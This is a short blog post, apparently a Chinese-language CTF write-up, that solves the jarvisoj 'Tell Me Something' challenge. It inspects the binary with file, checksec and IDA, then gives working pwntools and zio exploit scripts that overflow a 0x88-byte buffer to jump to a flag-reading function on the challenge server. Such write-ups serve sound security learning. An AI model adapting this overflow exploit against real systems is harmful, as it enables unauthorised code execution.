---
layout:     post
title:      jarvisoj Tell Me Something
author:     wooy0ung
tags: 		linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Problem Description:
Do you have something to tell me?

Download:
https://dn.jarvisoj.com/challengefiles/guestbook.d3d5869bd6fb04dd35b29c67426c0f05

Address:
nc pwn.jarvisoj.com 9876
```
<!-- more -->


### 0x01 file命令查看文件是64位elf格式

```
file guestbook
```

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x00.png)

### 0x02 checksec查看开了哪些保护，发现只有NX

```
checksec guestbook
```

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x01.png)

### 0x03 在kali linux 2.0中执行程序
```
chmod a+x ./guestbook
./guestbook
```

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x02.png)

### 0x04 执行文件放到IDA中分析

发现good_game这个函数很可疑

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x03.png)

跟进去发现函数内部在读取flag，这应该就是我们要找的关键函数

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x04.png)

接下来对main函数进行分析，发现没有调用到good_game，但存在read这个溢出函数

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x05.png)

看一下缓冲区到返回地址的距离，0x88个字节

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x06.png)

### 0x05 现在可以开始写exploit

调用pwntools

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *
payload = "A" * 0x88 + p64(0x400620)
# Io = process('./guestbook')
Io = remote('pwn.jarvisoj.com', 9876)
Io.recvuntil('message:')
Io.send(payload)
Io.interactive()
```

调用zio
```
#!/usr/bin/python
# -*- coding:utf8 -*-

import zio
payload = "A"*0x88 + "\x20\x06\x40\x00\x00\x00\x00\x00"
# Io = zio.zio('./guestbook')
Io = zio.zio(('pwn.jarvisoj.com',9876))
Io.write(payload)
Io.interact()
```

得到flag

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-tell-me-something/0x07.png)